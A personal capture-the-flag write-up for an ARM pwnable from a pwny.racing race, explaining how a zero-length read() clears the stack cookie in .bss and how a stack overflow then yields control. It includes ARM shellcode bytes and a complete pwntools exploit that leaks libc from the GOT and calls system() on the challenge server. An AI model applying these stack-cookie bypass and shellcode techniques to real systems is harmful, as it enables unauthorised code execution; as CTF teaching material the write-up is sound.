I didn't finish the exploit during the race but this is my post-pwnyrace exploit / analysis. It was an interesting arm challenge that b0bb used to display a couple of fun quirks.
- qemu-user doesn't apply nx/aslr/pie etc by default. 
- arm stores its stack-cookie in the .bss compared to f.ex. the gs/fs register on x86
- the POSIX-trick of half-closing the connection to make `read()` return zero, f.ex. via socket.shutdown() in pwntools (thanks ZetaTwo)

I was aware of the two first quirks and the latter was in the back of my head but didn't hit me until we got the hint during the race :)

The first bug was if `read()` returns zero in the following code, there will be an out-of-bounds write of 8 zero bytes.
```
    res = read(0, in_buf, 32u);
    *(_QWORD *)&in_buf[8 * (res + 0x1FFFFFFF)] = 0LL;
```
More exactly, the above calculation will end up pointing to `.bss:00022008` which is the stack cookie.
```
.bss:00022008                 AREA .bss, DATA, ALIGN=3
.bss:00022008                 ; ORG 0x22008
.bss:00022008                 EXPORT __stack_chk_guard
.bss:00022008 __stack_chk_guard % 4                   ; DATA XREF: LOAD:00010234↑o
.bss:00022008                                         ; sub_10538+4↑o ...
.bss:00022008                                         ; Copy of shared data
.bss:0002200C byte_2200C      % 1                     ; DATA XREF: sub_105A0+4↑o
.bss:0002200C                                         ; sub_105A0+8↑r ...
.bss:0002200D                 ALIGN 0x10
.bss:00022010 ; char in_buf[]
.bss:00022010 in_buf          % 1                     ; DATA XREF: sub_10654+7C↑o
.bss:00022010                                         ; sub_10654+98↑o ...
```
In short, using the POSIX-trick we can zero-out the stack-cookie in the .bss, making it predictable.

The second bug was an ordinary stackoverflow. We can write numbers past the static buffer that's allocated on the stack. This allows us to control the value of the stack-cookie in the stack too, by setting it to zero we pass the check below and get pc-control.
```
 →    0x107a0                  cmp    r2,  r3 // you shall not pass
      0x107a4                  beq    0x107ac
      0x107a8                  bl     0x10478 <__stack_chk_fail@plt>
```

Once we have pc-control we have to do something like `system("./flag_submitter likvidera")` to win.

We control 32 bytes at `.bss 0x220010`, NX is not enabled so we can run shellcode there. Considering the length of our command and the size-limit, a small shellcode-stub will do.

ASLR is not enabled but the libc was loaded at a different base on the remote system, so I had to leak the `libc.read()` pointer from the `.got`table.

Finally we just use our shellcode-stub to setup our command passed to system() while considering that we need to branch from 32-bit arm code to 16-bit thumb-code in the libc.

To produce the small stub of arm shellcode we can use `kstool` from the keystone-engine.
```
## cat system.asm | kstool arm
# set r0 to point to our cmd in the .bss
# set pc to system+1
pop {r0, pc}
cmd: .asciz "./flag_submitter likvidera"
```

Exploit steps are:
- leak remote libc address by dumping the .got table
- set stack-cookie both in the .bss and the stack to zero to pass the stack-cookie check
- write a <= 32byte shellcode-stub to the .bss
- populate the stack with the address to our cmd in the .bss and the address to system
- half-close the connection via socket.shutdown() to get pc-control that eventually calls `system("./flag_submitter likvidera")`

Final exploit:
``` python
#! /usr/bin/env python2

from pwn import *
import array
import time
import sys
import os

context.terminal = ['rxvt-unicode', '-e', 'sh', '-c']
context.log_level = 'info'

def sendnum(r, num):
  r.readuntil('<<')
  r.sendline(str(num))
  time.sleep(.1)

def leak_stack(r):
  stack = array.array('i',(int(0x21fd4) for i in range(0,30))) # 'spray' chall11.got.read
  stack[16] = 0               # set stack-cookie to zero
  stack[18] = int(0x22010)    # pc - shellcode stub
  stack[20] = int(0x000106C8) # pop pc - chall11.write()
  for n in stack:
    sendnum(r, n)

def pwn_stack(r, system):
  stack = array.array('i',(int(0x22014) for i in range(0,30))) # 'spray' cmd offset
  stack[16] = 0             # set stack-cookie to zero
  stack[18] = int(0x22010)  # pc - shellcode stub
  stack[20] = system        # pop pc - system()
  for n in stack:
    sendnum(r, n)

def write_leak_sc(r):
  '''
  # cat leak.asm | kstool arm
  mov r0, #1
  mov r2, 8
  pop {r1, pc} 
  '''
  payload = "\x01\x00\xa0\xe3\x08\x20\xa0\xe3\x02\x80\xbd\xe8".ljust(32, '\x00')
  r.send(payload)

def write_pwn_sc(r):
  '''
  # cat system.asm | kstool arm
  pop {r0, pc}
  cmd: .asciz "./flag_submitter likvidera"
  '''
  payload = "\x01\x80\xbd\xe8\x2e\x2f\x66\x6c\x61\x67\x5f\x73\x75\x62\x6d\x69\x74\x74\x65\x72\x20\x6c\x69\x6b\x76\x69\x64\x65\x72\x61\x00".ljust(32, '\x00')
  r.send(payload)

def trigger(r):
  r.readuntil('<<')
  r.shutdown()
  
def pwn():
  if sys.argv[1] == "r":
    r = remote('challenge.pwny.racing', 11535)
    if len(sys.argv) > 2:
      leak_stack(r)
      write_leak_sc(r)
    else:
      pwn_stack(r, system=-9501491)
      write_pwn_sc(r)
  else:
    r = remote('127.0.0.1', 3333)
    if len(sys.argv) > 2:
      leak_stack(r)
      write_leak_sc(r)
    else:
      pwn_stack(r, system=-9468723)
      write_pwn_sc(r)
  trigger(r)
  r.interactive()

if __name__ == '__main__':
  pwn()
```
```
[+] Opening connection to challenge.pwny.racing on port 11535: Done
[*] Switching to interactive mode
 << 
██╗   ██╗ ██████╗ ██╗   ██╗    ██╗      ██████╗ ███████╗███████╗██╗
╚██╗ ██╔╝██╔═══██╗██║   ██║    ██║     ██╔═══██╗██╔════╝██╔════╝██║
 ╚████╔╝ ██║   ██║██║   ██║    ██║     ██║   ██║███████╗█████╗  ██║
  ╚██╔╝  ██║   ██║██║   ██║    ██║     ██║   ██║╚════██║██╔══╝  ╚═╝
   ██║   ╚██████╔╝╚██████╔╝    ███████╗╚██████╔╝███████║███████╗██╗
   ╚═╝    ╚═════╝  ╚═════╝     ╚══════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝

Unfortunately someone else already submitted the flag. Better luck next time.
/home/ctf/redir.sh: line 2:   199 Segmentation fault      (core dumped) ./chall
[*] Closed connection to challenge.pwny.racing port 11535
[*] Got EOF while reading in interactive
```
